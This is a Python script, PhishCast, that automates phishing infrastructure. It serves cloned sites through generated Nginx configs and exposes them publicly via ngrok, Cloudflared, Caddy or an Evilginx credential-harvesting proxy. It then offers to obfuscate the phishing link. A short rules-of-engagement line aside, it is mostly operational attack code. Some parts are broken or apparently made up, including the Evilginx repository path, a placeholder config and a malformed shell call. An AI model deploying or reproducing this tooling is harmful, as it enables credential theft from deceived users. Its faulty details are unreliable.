######################################################################################################################################################################################################################
# Python script for phishing sites and link generation Note: Be mindful of the scope of work, & rules of engagement.
# sudo python3 PhishCast.py - ensure all file are located in the same folder. For evilginx interaction after installation, SSL certificates and domain settings in the Evilginx configuration file (config.yml)
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import os
import subprocess
import sys
import random
import string


# Banner
def display_splash_screen():
    splash = r"""
  
 __________.__    .__        .__    _________                  __          _____  ____         .__       _____           _______  ____ 
\______   \  |__ |__| ______|  |__ \_   ___ \_____    _______/  |_       /  |  |/_   |______  |  |__   /  |  |          \   _  \/_   |
 |     ___/  |  \|  |/  ___/|  |  \/    \  \/\__  \  /  ___/\   __\     /   |  |_|   |\____ \ |  |  \ /   |  |_  ______ /  /_\  \|   |
 |    |   |   Y  \  |\___ \ |   Y  \     \____/ __ \_\___ \  |  |      /    ^   /|   ||  |_> >|   Y  |    ^   / /_____/ \  \_/   \   |
 |____|   |___|  /__/____  >|___|  /\______  (____  /____  > |__|______\____   | |___||   __/ |___|  |____   |           \_____  /___|
               \/        \/      \/        \/     \/     \/     /_____/     |__|      |__|         \/     |__|                 \/  

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |
     
"""
    print(splash)


# Function to generate Nginx config for the selected site
def generate_nginx_config(site_name):
    site_folder = os.path.join("sites", site_name)
    if not os.path.exists(site_folder):
        print(f"Site folder for {site_name} does not exist.")
        return None

    nginx_config_path = f"/etc/nginx/sites-available/{site_name}"
    symlink_path = f"/etc/nginx/sites-enabled/{site_name}"

    # Nginx config template
    nginx_config = f"""
server {{
    listen 80;
    server_name localhost;

    root {site_folder};  # Path to the selected site folder

    index index.php index.html;
    location / {{
        try_files $uri $uri/ =404;
    }}

    location ~ \.php$ {{
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;  # Adjust to your PHP-FPM version
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }}

    location /assets/ {{
        try_files $uri =404;
    }}
}}
"""

    # Write the config to the file
    with open(nginx_config_path, 'w') as config_file:
        config_file.write(nginx_config)

    # Create a symlink to enable the site
    if not os.path.exists(symlink_path):
        os.symlink(nginx_config_path, symlink_path)

    return nginx_config_path

# Function to reload Nginx and serve the selected site
def serve_site_with_nginx(site_name):
    nginx_config_path = generate_nginx_config(site_name)
    if nginx_config_path:
        print(f"Generated Nginx config for {site_name}: {nginx_config_path}")

        # Reload Nginx to apply the new config
        try:
            subprocess.run(["sudo", "nginx", "-s", "reload"], check=True)
            print(f"Successfully started Nginx and serving {site_name}")
        except subprocess.CalledProcessError as e:
            print(f"Error restarting Nginx: {e}")

# Function to check if a command exists
def command_exists(command):
    return subprocess.call(f"type {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) == 0

# Function to handle reverse proxy options (NGROK, Caddy, Cloudflared, Evilginx)
def reverse_proxy_setup():
    print("\nSelect a reverse proxy:")
    print("1. NGROK          2. Caddy          3. Cloudflared       4. Evilginx")
    choice = int(input("Enter the number of the reverse proxy to use: "))

    url = None
    if choice == 1:
        if not command_exists("ngrok"):
            print("Installing NGROK...")
            subprocess.run(["wget", "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"], check=True)
            subprocess.run(["unzip", "ngrok-stable-linux-amd64.zip"], check=True)
            subprocess.run(["sudo", "mv", "ngrok", "/usr/local/bin/ngrok"], check=True)
        print("Starting NGROK...")
        process = subprocess.Popen(["ngrok", "http", "80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        url = extract_ngrok_url()
        if url:
            print(f"NGROK URL: {url}")
    elif choice == 2:
        if not command_exists("caddy"):
            print("Installing Caddy...")
            subprocess.run(["sudo", "apt-get", "install", "-y", "caddy"], check=True)
        print("Starting Caddy...")
        subprocess.run(["caddy", "run", "--config", "/etc/caddy/Caddyfile"], check=True)
        print("Caddy is running. Please check your Caddy configuration for the URL.")
    elif choice == 3:
        if not command_exists("cloudflared"):
            print("Installing Cloudflared...")
            subprocess.run(["wget", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"], check=True)
            subprocess.run(["sudo", "dpkg", "-i", "cloudflared-linux-amd64.deb"], check=True)
        print("Starting Cloudflared...")
        process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:80"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        url = extract_cloudflared_url()
        if url:
            print(f"Cloudflared URL: {url}")
    elif choice == 4:
        # Installing Evilginx dependencies
        if not command_exists("git"):
            print("Installing Git...")
            subprocess.run(["sudo", "apt-get", "install", "-y", "git"], check=True)

        if not command_exists("go"):
            print("Installing Go...")
            subprocess.run(["sudo", "apt-get", "install", "-y", "golang"], check=True)

        if not command_exists("make"):
            print("Installing Make...")
            subprocess.run(["sudo", "apt-get", "install", "-y", "make"], check=True)

        # Clone Evilginx repo
        if not os.path.exists("evilginx2"):
            print("Cloning Evilginx repository...")
            subprocess.run(["git", "clone", "https://github.com/evilmartians/evilginx2.git"], check=True)

        print("Building Evilginx...")
        subprocess.run(["cd", "evilginx2", "&&", "make", "install"], shell=True, check=True)

        print("Evilginx installed successfully.")

        # Configuring Evilginx
        evilginx_config_dir = "/etc/evilginx2/config"
        if not os.path.exists(evilginx_config_dir):
            print(f"Creating configuration directory: {evilginx_config_dir}")
            os.makedirs(evilginx_config_dir, exist_ok=True)

        evilginx_config_file = os.path.join(evilginx_config_dir, "config.yml")
        config_content = """
        server:
            listen: 8080
            domain: "yourdomain.com"
            ssl: true
            certs: /path/to/certs
        reverse_proxy:
            target: "http://localhost:80"
            protocol: "http"
        """

        with open(evilginx_config_file, 'w') as config_file:
            config_file.write(config_content)

        print(f"Evilginx configured at {evilginx_config_file}")

        # Start Evilginx
        print("Starting Evilginx...")
        subprocess.run(["sudo", "evilginx", "-p", "/etc/evilginx2/config"], check=True)
        url = "http://your-evilginx-url"  # Evilginx would output this on successful setup

    else:
        print("Invalid choice. Please try again.")
        reverse_proxy_setup()
        return

    if url:
        print("\nDo you want to obfuscate the URL? (yes/no)")
        obfuscate = input().strip().lower()
        if obfuscate == 'yes':
            obfuscated_url = obfuscate_url(url)
            print(f"Obfuscated URL: {obfuscated_url}")
